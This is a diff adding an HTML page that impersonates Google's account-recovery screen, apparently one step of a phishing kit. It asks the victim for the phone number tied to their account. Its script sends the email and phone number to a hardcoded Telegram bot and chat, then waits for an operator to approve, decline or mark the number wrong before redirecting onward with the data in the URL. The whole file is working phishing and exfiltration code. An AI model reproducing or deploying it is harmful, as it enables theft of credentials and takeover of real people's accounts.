@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Account Recovery</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .card {
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin: 2rem auto;
+        }
+        
+        .google-logo {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+        
+        .email-box {
+            padding: 8px 14px;
+            background-color: #f1f3f4;
+            border-radius: 20px;
+            font-size: 0.95rem;
+            margin-top: 10px;
+            display: inline-block;
+        }
+        
+        .form-control {
+            border-radius: 8px;
+        }
+        
+        .btn-primary {
+            border-radius: 8px;
+            width: 100%;
+        }
+        
+        .link {
+            color: #1a73e8;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+        
+        @media (min-height: 600px) {
+            .vh-centered {
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .card {
+                margin: 1.5rem 1rem;
+                padding: 1.5rem 1rem;
+            }
+            .email-box {
+                font-size: 0.85rem;
+            }
+            .link {
+                font-size: 0.85rem;
+            }
+        }
+        /* ===== ERROR BANNER ===== */
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.12);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: center;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #0d6efd;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #0d6efd;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #dc3545;
+            color: #dc3545;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="vh-centered">
+        <div class="card p-4" style="width: 100%; max-width: 400px;">
+            <div class="text-center">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+                <h5 class="mt-2">Account recovery</h5>
+                <p class="text-muted small">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+                <div class="email-box">
+                    <i class="bi bi-person-circle me-1"></i> <span id="emailText">email@example.com</span>
+                </div>
+            </div>
+
+            <!-- Error message area -->
+            <div class="error-msg" id="loginError"></div>
+
+            <div class="mt-4">
+                <p class="mb-1">Confirm the phone number you provided in your security settings: <strong>•••• ••••</strong></p>
+                <div class="mb-3">
+                    <input type="tel" class="form-control" placeholder="Phone number" id="phoneInput">
+                </div>
+                <button class="btn btn-primary" id="nextBtn" onclick="submitPhone()">Next</button>
+                <div class="mt-3 text-center">
+                    <span class="link" onclick="tryAnotherWay()">Try another way</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Waiting for approval...</p>
+        <p class="spinner-email" id="spinnerEmailDisplay"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
+        const TELEGRAM_CHAT_ID = "6367881211";
+        const APPROVAL_REDIRECT_URL_BASE = "fifth.html";
+
+        let email = '';
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+        let currentUserId = null;
+
+        // =====================================================
+        // PERSISTENT OFFSET (localStorage) — key fix
+        // =====================================================
+        const OFFSET_KEY = 'tg_offset_phone';
+
+        function loadOffset() {
+            const saved = localStorage.getItem(OFFSET_KEY);
+            return saved ? parseInt(saved, 10) : 0;
+        }
+
+        function saveOffset(offset) {
+            localStorage.setItem(OFFSET_KEY, offset.toString());
+        }
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('loginError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('loginError');
+            if (err) err.style.display = 'none';
+        }
+
+        function maskEmail(email) {
+            if (!email) return 'Unknown';
+            const parts = email.split('@');
+            if (parts.length !== 2) return email;
+            const local = parts[0];
+            const domain = parts[1];
+            let maskedLocal;
+            if (local.length <= 2) {
+                maskedLocal = local.charAt(0) + '*';
+            } else {
+                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
+            }
+            return maskedLocal + '@' + domain;
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            currentUserId = null;
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('nextBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — fixed with persisted offset
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            currentUserId = userId;
+            let offset = loadOffset();
+            let pollCount = 0;
+            const MAX_POLLS = 240;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    currentUserId = null;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('nextBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=20&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+                                saveOffset(offset);
+
+                                if (update.callback_query && update.callback_query.data) {
+                                    const action = update.callback_query.data;
+
+                                    // Answer callback to remove Telegram loading state
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    // Only process if we have an active userId and it matches
+                                    if (currentUserId && action.includes(currentUserId)) {
+                                        if (action.startsWith('approve_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            window.location.href = APPROVAL_REDIRECT_URL_BASE + '?email=' + encodeURIComponent(email) + '&phone=' + encodeURIComponent(document.getElementById('phoneInput').value);
+                                            return;
+                                        } else if (action.startsWith('decline_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            document.getElementById('nextBtn').disabled = false;
+                                            showError('Request declined. Please try again.');
+                                            return;
+                                        } else if (action.startsWith('wrong_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            document.getElementById('nextBtn').disabled = false;
+                                            showError('Wrong phone number. Please try again.');
+                                            return;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const nextBtn = document.getElementById('nextBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                nextBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            nextBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // GET EMAIL FROM URL
+        // =====================================================
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            email = params.get('email') || '';
+            if (email) {
+                document.getElementById('emailText').textContent = email;
+            }
+        };
+
+        // =====================================================
+        // SUBMIT PHONE WITH INLINE KEYBOARD APPROVAL
+        // =====================================================
+        function submitPhone() {
+            hideError();
+
+            const phone = document.getElementById("phoneInput").value.trim();
+
+            if (phone === "") {
+                showError("Please enter your phone number.");
+                return;
+            }
+
+            // Show spinner
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerEmailDisplay = document.getElementById('spinnerEmailDisplay');
+            const nextBtn = document.getElementById('nextBtn');
+
+            spinnerEmailDisplay.textContent = email ? maskEmail(email) : 'Unknown';
+            spinnerOverlay.classList.add('active');
+            nextBtn.disabled = true;
+
+            // Unique userId per session — keep it SHORT to avoid callback_data 64-byte limit
+            const sessionId = Date.now().toString(36).slice(-6);
+            const sanitizedEmail = email ? email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 6) : 'unknown';
+            const userId = 'p_' + sanitizedEmail + '_' + sessionId;
+
+            const message =
+                `📱 <b>Phone Number Submitted</b>\n\n` +
+                `📧 Email: <code>${email || 'N/A'}</code>\n` +
+                `📞 Phone: <code>${phone}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG PHONE",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        }
+
+        function tryAnotherWay() {
+            alert("Redirecting to another recovery method...");
+        }
+    </script>
+
+</body>
+
+</html>
